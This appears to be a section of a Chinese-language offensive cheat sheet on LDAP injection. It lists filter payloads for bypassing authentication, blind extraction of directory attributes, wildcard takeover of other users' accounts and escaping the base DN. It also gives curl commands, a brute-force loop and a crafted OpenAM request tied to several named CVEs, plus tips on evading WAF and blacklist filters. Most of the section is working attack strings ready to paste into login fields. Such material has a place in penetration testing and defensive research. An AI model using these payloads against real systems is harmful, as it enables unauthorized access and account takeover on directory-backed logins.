## 三、认证绕过与通配符滥用

### 3.1 经典永真条件绕过（v2.0核心保留并深化）

原始查询：`(&(uid=USER)(userPassword=PASS))`

```
# ① 密码位注入（最通用）
PASS = *                    → (&(uid=admin)(userPassword=*)) 存在性测试恒真
PASS = *)(|(uid=*))         → 闭合后追加OR恒真分支
PASS = *)(|(objectClass=*)) → 同上，objectClass必存在更稳

# ② 用户名位注入（闭合第一个条件）
USER = admin)(&))           → (&(uid=admin)(&))(userPassword=xxx) 恒真
USER = admin)(|(password=*))→ (&(uid=admin)(|(password=*))(userPassword=xxx))
USER = *)(|(uid=*))         → 直接命中第一个用户（可能是管理员，注意首条目即admin的目录）

# ③ 双字段配合（PayloadsAllTheThings经典）
USER = *)(uid=*))(|(uid=*
PASS = password
→ (&(uid=*)(uid=*))(|(uid=*)(userPassword=password)) 命中所有用户

# ④ 取反构造（NOT闭合）
USER = admin)(!(&(1=0
PASS = q))
→ (&(uid=admin)(!(&(1=0)(userPassword=q))))  内层恒假取反恒真
```

### 3.2 AND/OR/NOT逻辑注入深化

**OR短路泄露（盲注属性提取的标准姿势）：**
```
USER = htb-stdnt)(|(description=*
PASS = invalid)
→ (&(uid=htb-stdnt)(|(description=*)(password=invalid)))
# 若description非空则登录"成功"→ 用 description=<前缀>* 逐字符盲注该属性
```

**双重否定绕过简单过滤规则：**
```
# 检测规则若拦 (objectClass=*) 或 (uid=*)，用等价恒真替换：
USER = *)(!(!(objectClass=*)))
→ 双重NOT = 恒真，绕过基于特征串的WAF/黑名单
```

**AND中注入假条件制造可控分支（时间/错误盲注辅助）：**
```
USER = admin)(&(badattr=*)(|(cn=
→ (&(uid=admin)(&(badattr=*)(|(cn=*))(password=xxx))
# 不存在属性badattr → 整体假 → 与真条件响应差异可用于二分枚举
```

### 3.3 通配符滥用（Wildcard Abuse）——横向接管（2026热点）

**核心洞察（2026年多起CVE共性）：** 只要输入中的`*`未被转义，攻击者即使**不知道密码**，也能用**已知的一个合法密码**横向接管"第一个匹配用户"：

```
# CVE-2026-42568 Yamcs LdapAuthModule：username直接拼接filter
curl -X POST "http://TARGET:8090/auth/token" \
  -d "grant_type=password&username=*&password=known_password"
# 过滤器变为 (&(uid=*)(password=known_password)) → 返回第一个共享该密码/更前面的用户
# → 水平权限提升：攻击者掌握任意一个弱密码即可接管密码相同或排序更靠前的账户

# 通配符+已知口令自动化横向接管
for user in "a*" "ad*" "adm*" "admin*" "*"; do
  curl -s -X POST http://target/auth \
    -d "username=$user&password=<REDACTED>" -w "%{http_code} $user\n"
done
# 命中200即接管——排序靠前的管理员账号通常比普通用户更早命中
```

**通配符滥用等级：**
```
*                 → 命中第一条（任意用户，通常是第一条管理员）
a*  ad*  adm*     → 前缀定向命中（缩小到目标前缀）
*)(|(cn=*)        → 结构化命中
*))(|(cn=*))      → 外层有额外括号时的变体
```
**实战提示：** 排序靠前策略——AD中 `(uid=*)` 通常按目录树顺序返回，`ou=Administrators` 前置于普通用户OU时威胁更大；目录用户数量越大，`*` 命中管理员的概率越高。

### 3.4 RDN/过滤器混淆与截断

**（1）RDN（DN上下文）混淆：**
```
# 基DN注入逃逸分区
base = "ou=" + input + ",dc=corp,dc=local"
input = Restricted,dc=corp,dc=local        → 基DN逃逸到整域搜索
input = Restricted,dc=corp,dc=local\0A,... → 换行注入LDIF修改
# DN内RFC 4514转义要求转义：+ ; < > \ # " , =
# 若开发者只做了过滤器转义(filters)未做DN转义(nameEncode)，此处即可利用
```

**（2）空字节截断（老版本C实现）：**
```
USER = admin%00          → C字符串在NUL处截断，密码检查被丢弃
USER = *)(uid=*))%00     → 闭合后NUL截断，丢弃尾部(userPassword=...)
# 现代实现（Java/Python/新OpenLDAP）已拒绝NUL，但C写的老系统仍存在
```

**（3）畸形括号与注释：**
```
# LDAP不支持注释语法，但部分实现容忍尾随未闭合/多余括号
USER = admin)   → 部分服务器容错返回（畸形容错模糊测试）
USER = *)(&     → 未闭合AND（部分实现忽略后续）
```

### 3.5 2025-2026实战案例（时效性验证）

**CVE-2026-46619：OpenAM MSISDN认证绕过（无需密码拿会话）**
```
POST /openam/json/realms/root/authenticate?authIndexType=module&authIndexValue=MSISDN HTTP/1.1
X-OpenAM-Username: *
{"authId":"<valid-auth-tree-id>",
 "callbacks":[{"type":"NameCallback",
   "input":[{"name":"IDToken1","value":"*)(uid=*"}]}]}
# 过滤器 (sunIdentityMSISDNNumber=*)(uid=* → 返回首个用户 → OpenAM签发该用户会话
# 根因：MSISDN号码直接拼接过滤器 + 可信网关默认allow-all（双漏洞叠加）
```

**CVE-2026-40459：PAC4J多方法LDAP注入（CVSS 8.8）**
```
# 影响 PAC4J <4.5.10 / <5.7.10 / <6.4.1，低权限攻击者注入ID类搜索参数
# 后果：未授权LDAP查询 + 任意目录操作 → 常用于SSO认证链（CAS等依赖PAC4J）
# 检测：对所有以ID/名称类参数驱动的查找接口注入 *) 观察响应差异
```

**CVE-2026-42568：Yamcs认证模块通配符横向接管（见3.3）**

**CVE-2026-58222：Samba AD DC Compare注入 + 授权缺失（gMSA沦陷）**
```
# 低权限域用户 → 提取 msKds-RootKeyData → 离线推导gMSA密码 → 若gMSA有高权限 → 域沦陷
# 面：LDAP Compare 请求的用户可控属性名未被过滤，且在可信上下文执行内部搜索
```

